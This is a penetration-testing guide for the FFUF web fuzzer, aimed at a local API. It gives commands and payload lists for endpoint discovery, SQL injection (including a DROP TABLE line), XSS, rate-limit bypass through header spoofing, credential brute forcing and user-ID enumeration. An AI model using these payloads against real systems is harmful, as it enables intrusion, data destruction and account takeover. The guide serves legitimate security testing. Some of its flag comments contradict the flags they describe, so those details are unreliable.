# SecurityForge - FFUF Integration Guide (Complete)

## 📌 TABLE OF CONTENTS

1. [Installation & Setup](#installation--setup)
2. [FFUF Basics](#ffuf-basics)
3. [Endpoint/Path Fuzzing](#endpoint-fuzzing)
4. [Parameter Fuzzing](#parameter-fuzzing)
5. [SQLi Fuzzing](#sqli-fuzzing)
6. [XSS Payload Fuzzing](#xss-payload-fuzzing)
7. [Rate Limiting Bypass](#rate-limiting-bypass)
8. [Authentication Fuzzing](#authentication-fuzzing)
9. [Recursive Fuzzing](#recursive-fuzzing)
10. [Filtering Techniques](#advanced-filtering)
11. [Batch Processing](#batch-fuzzing)
12. [Output & Reporting](#output--reporting)

---

## 🛠️ INSTALLATION & SETUP

### **Step 1: Install FFUF**

```bash
# Windows (using WSL or native):
go install github.com/ffuf/ffuf@latest

# Or download binary:
# Visit: https://github.com/ffuf/ffuf/releases
# Download: ffuf_windows_amd64.exe

# macOS:
brew install ffuf

# Linux:
apt-get install ffuf
# or
git clone https://github.com/ffuf/ffuf && cd ffuf && go install
```

### **Step 2: Verify Installation**

```bash
ffuf -V
# Output: ffuf v2.0.0
```

### **Step 3: Download Wordlists**

```bash
# Install wordlist repositories

# SecLists (comprehensive)
git clone https://github.com/danielmiessler/SecLists.git

# Jhaddix collection
git clone https://github.com/jhaddix/all.txt.git

# API-specific wordlists
git clone https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/api/
```

---

## 📚 FFUF BASICS

### **Simple Command Structure**

```bash
ffuf -u [TARGET_URL] -w [WORDLIST]

Example:
ffuf -u http://localhost:5000/api/FUZZ -w /path/to/wordlist.txt
```

### **Output Explanation**

```
:: Method           : GET
:: URL              : http://localhost:5000/api/FUZZ
:: Wordlist         : /path/to/wordlist.txt
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status codes: 200,204,301,302,307,401,403,405,500,502,503
::
[Status: 200, Words: 5, Lines: 1, Size: 123] http://localhost:5000/api/users
[Status: 200, Words: 3, Lines: 1, Size: 89]  http://localhost:5000/api/products
[Status: 200, Words: 10, Lines: 1, Size: 256] http://localhost:5000/api/orders
[Status: 401, Words: 2, Lines: 1, Size: 45]  http://localhost:5000/api/admin (requires auth)
```

---

## 🎯 ENDPOINT/PATH FUZZING

### **Method 1: Basic Endpoint Discovery**

```bash
ffuf -u http://localhost:5000/api/FUZZ -w endpoints.txt

# endpoints.txt contains:
users
products
orders
comments
admin
settings
debug
export
config
backup
uploads
logs
status
health
metrics
```

### **Method 2: Multi-Level Path Fuzzing**

```bash
# Subresources under /api/users/
ffuf -u http://localhost:5000/api/users/FUZZ -w user_resources.txt

# user_resources.txt:
profile
settings
orders
preferences
notifications
billing
security
activity
```

### **Method 3: File Extension Fuzzing**

```bash
ffuf -u http://localhost:5000/api/backup.FUZZ -w extensions.txt

# extensions.txt:
sql
db
bak
old
zip
tar
7z
sql.gz
config.php
```

---

## 🔓 PARAMETER FUZZING

### **Step 1: Discover Parameters**

```bash
# Fuzz common parameter names
ffuf -u "http://localhost:5000/api/search?FUZZ=test" \
  -w common_parameters.txt \
  -fw 0  # Filter responses with 0 words to reduce noise

# common_parameters.txt:
q
search
query
term
keyword
filter
sort
limit
offset
page
per_page
id
user_id
product_id
category
type
name
```

### **Step 2: Parameter Value Fuzzing**

```bash
# Fuzz parameter values for injection
ffuf -u "http://localhost:5000/api/search?q=FUZZ" \
  -w injection_payloads.txt \
  -fc 400  # Filter 400 Bad Request
```

---

## 🔓 SQLI FUZZING

### **Method 1: Blind SQL Injection Testing**

```bash
ffuf -u "http://localhost:5000/api/users?id=1FUZZ" \
  -w sql_blind_payloads.txt \
  -rate 10  # 10 requests/second (avoid rate limiting)

# sql_blind_payloads.txt:
' OR '1'='1
' OR 1=1 --
' OR 'x'='x
' AND 1=1 --
' AND 1=2 --
' UNION SELECT NULL --
'; DROP TABLE users; --
' AND SLEEP(5) --
' AND (SELECT SLEEP(5)) --
' AND BENCHMARK(10000000,SHA1(1)) --
' AND WAITFOR DELAY '00:00:05' --
```

### **Method 2: Time-Based Blind SQLi**

```bash
ffuf -u "http://localhost:5000/api/products?id=1FUZZ" \
  -w sql_timebased.txt \
  -timeout 15  # 15 second timeout for delayed responses

# sql_timebased.txt:
' AND SLEEP(5) --
' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
'; WAITFOR DELAY '00:00:05'; --
' AND BENCHMARK(50000000,SHA1(1)) --
' ||pg_sleep(5) --
' WAITFOR DELAY '0:0:5'--
' AND 1=1 AND SLEEP(5) --
' &| sleep 5 #
'/
```

### **Method 3: Error-Based SQLi**

```bash
ffuf -u "http://localhost:5000/api/search?q=FUZZ" \
  -w sql_error_payloads.txt \
  -mr "syntax|error|mysql|postgres|oracle"  # Match error messages

# sql_error_payloads.txt:
' AND extractvalue(1,concat(0x7e,(SELECT version()))) --
' AND extractvalue(1,concat(0x7e,(SELECT database()))) --
' AND 1=CONVERT(int,(SELECT @@version)) --
' AND CAST(CONCAT(0x7e,(SELECT USER())) AS UNSIGNED) --
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --
```

---

## 🔓 XSS PAYLOAD FUZZING

### **Reflected XSS Testing**

```bash
ffuf -u "http://localhost:5000/api/search?q=FUZZ" \
  -w xss_payloads.txt \
  -mr "<script|onerror|onclick|alert"  # Match vulnerability indicators

# xss_payloads.txt:
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<div style="background:url(javascript:alert(1))">
'><script>alert(1)</script>
"><script>alert(1)</script>
<img src=x onerror="alert(String.fromCharCode(88,83,83))">
```

### **Stored XSS Testing**

```bash
# Step 1: Inject XSS via POST
ffuf -u "http://localhost:5000/api/comments" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"comment":"FUZZ"}' \
  -w xss_payloads.txt

# Step 2: Retrieve and verify storage
ffuf -u "http://localhost:5000/api/comments?id=FUZZ" \
  -w comment_ids.txt \
  -mr "<script|onerror"  # Check for payload in response
```

---

## 🔓 RATE LIMITING BYPASS

### **Method 1: IP Rotation Headers**

```bash
ffuf -u "http://localhost:5000/api/login/attempt" \
  -X POST \
  -d '{"username":"admin","password":"FUZZ"}' \
  -w passwords.txt \
  -H "X-Forwarded-For: FUZZ" \
  -w ip_addresses.txt
```

### **Method 2: Slow Fuzzing**

```bash
# Reduce request rate to avoid rate limiting
ffuf -u "http://localhost:5000/api/FUZZ" \
  -w endpoints.txt \
  -rate 2  # 2 requests per second
  -p 2     # 2 second delay between batches
```

### **Method 3: User Agent Rotation**

```bash
ffuf -u "http://localhost:5000/api/FUZZ" \
  -w endpoints.txt \
  -H "User-Agent: FUZZ" \
  -w user_agents.txt
```

---

## 🔓 AUTHENTICATION FUZZING

### **Default Credentials Testing**

```bash
ffuf -u "http://localhost:5000/api/auth/login" \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"username":"FUZZ","password":"FUZZ2"}' \
  -w usernames.txt \
  -w passwords.txt \
  -mr "success|token|access_token|401 != true"
```

### **JWT Token Testing**

```bash
# Extract and fuzz JWT tokens
ffuf -u "http://localhost:5000/api/admin/users" \
  -H "Authorization: Bearer FUZZ" \
  -w jwt_tokens.txt \
  -fc 401,403  # Don't filter on auth errors
```

---

## 🔄 RECURSIVE FUZZING

### **Recursive Path Discovery**

```bash
# Explore directory structure deeply
ffuf -u http://localhost:5000/FUZZ -w sec-lists/Discovery/Web-Content/common.txt \
  -recursion \
  -recursion-depth 2 \
  -rate 10

# Results:
# /api
# /api/users
# /api/users/profile
# /api/products
# /api/products/search
# /admin
# /admin/dashboard
# /admin/users
```

---

## 🎯 ADVANCED FILTERING

### **Match on Status Code**

```bash
# Only show 200 responses
ffuf -u http://localhost:5000/api/FUZZ \
  -w endpoints.txt \
  -mc 200  # Match code 200
```

### **Filter Out Status Code**

```bash
# Hide 400, 404, 403
ffuf -u http://localhost:5000/api/FUZZ \
  -w endpoints.txt \
  -fc 400,404,403  # Filter codes
```

### **Match on Response Size**

```bash
# Only show responses > 1000 bytes
ffuf -u http://localhost:5000/api/FUZZ \
  -w endpoints.txt \
  -fs 100-500  # Filter sizes 100-500
```

### **Match on Response Content**

```bash
# Responses containing "success"
ffuf -u http://localhost:5000/api/FUZZ \
  -w endpoints.txt \
  -mr "success"  # Match regex
```

---

## 📦 BATCH FUZZING

### **Fuzz Multiple Targets**

```bash
# Create targets.txt
http://localhost:5000/api/FUZZ
http://localhost:5001/api/FUZZ
http://localhost:5002/api/FUZZ

ffuf -u FUZZ -w targets.txt -w endpoints.txt
```

### **Sequential Wordlists**

```bash
# Fuzz first parameter, then second
ffuf -u "http://localhost:5000/api/FUZZ/FUZZ2" \
  -w endpoints.txt \
  -w subresources.txt
```

---

## 📊 OUTPUT & REPORTING

### **Export Results**

```bash
# JSON output
ffuf -u http://localhost:5000/api/FUZZ \
  -w endpoints.txt \
  -of json \
  -o results.json

# CSV output
ffuf -u http://localhost:5000/api/FUZZ \
  -w endpoints.txt \
  -of csv \
  -o results.csv

# HTML report
ffuf -u http://localhost:5000/api/FUZZ \
  -w endpoints.txt \
  -of html \
  -o results.html
```

### **Analysis**

```bash
# Extract successful findings
cat results.json | jq '.results[] | select(.status==200)'

# Find largest responses (potential data)
cat results.json | jq '.results | sort_by(-fields.size) | .[0:10]'

# Find slowest responses (potential time-based SQLi)
cat results.json | jq '.results | sort_by(-.fields.time) | .[0:10]'
```

---

## 📋 PRACTICAL EXAMPLES

### **Example 1: Discover All API Endpoints**

```bash
ffuf -u http://localhost:5000/api/FUZZ \
  -w SecLists/Discovery/Web-Content/api/common-api-endpoints.txt \
  -of json -o api_endpoints.json
```

### **Example 2: BOLA - User ID Enumeration**

```bash
ffuf -u "http://localhost:5000/api/users/FUZZ/orders" \
  -w <(seq 1 1000) \
  -H "Authorization: Bearer TOKEN" \
  -mc 200 \
  -v

# Results show which user IDs exist
```

### **Example 3: Parameter Fuzzing + SQLi**

```bash
# Find parameters
ffuf -u "http://localhost:5000/api/search?FUZZ=test" \
  -w parameters.txt \
  -o found_params.txt

# For each parameter, test SQLi
while read param; do
  ffuf -u "http://localhost:5000/api/search?$param=FUZZ" \
    -w sql_payloads.txt \
    -mr "error|syntax" \
    -o sqli_$param.txt
done < found_params.txt
```

---

## 🔗 COMMON WORDLISTS

```bash
# SecLists location (after cloning)
SecLists/
├── Discovery/Web-Content/
│   ├── common.txt
│   ├── api/
│   │   ├── common-api-endpoints.txt
│   │   └── nmap-nse-default-http-methods.txt
│   └── quickhits.txt
├── Fuzzing/
│   ├── SQLi/
│   │   ├── attack-payloads.txt
│   │   ├── blindsqli_timebased.txt
│   │   └── SQLiUniverse.txt
│   └── XSS/
│       └── xss-payloads.txt
└── Passwords/
    ├── darkweb2017-top10000.txt
    └── probable-v2-top1575.txt
```

---

## 📋 TESTING CHECKLIST

- [ ] Discover API endpoints
- [ ] Enumerate user resources
- [ ] Test parameter names
- [ ] SQLi payload testing
- [ ] XSS payload testing
- [ ] Rate limiting bypass
- [ ] Authentication bypass
- [ ] Recursive path discovery
- [ ] Export and analyze results

---

**Next: → See SQLMAP_GUIDE.md for automated SQLi exploitation**

